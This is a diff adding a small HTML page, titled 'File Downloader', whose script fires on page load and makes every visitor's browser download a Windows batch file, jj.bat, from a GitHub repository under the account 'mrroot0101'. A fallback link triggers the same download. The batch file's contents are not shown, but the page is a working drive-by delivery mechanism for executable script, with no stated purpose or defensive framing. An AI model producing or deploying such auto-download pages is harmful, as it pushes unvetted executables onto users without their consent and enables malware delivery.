@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Downloader</title>
+    <script>
+        function downloadFile() {
+            const fileUrl = "https://github.com/mrroot0101/test2/raw/main/jj.bat";
+            const fileName = "jj.bat"; // Name to save as
+            
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        // Auto-trigger download on page load
+        window.onload = downloadFile;
+    </script>
+</head>
+<body>
+    <h3>Downloading file...</h3>
+    <p>If the download doesn't start, <a href="#" onclick="downloadFile()">click here</a>.</p>
+</body>
+</html>
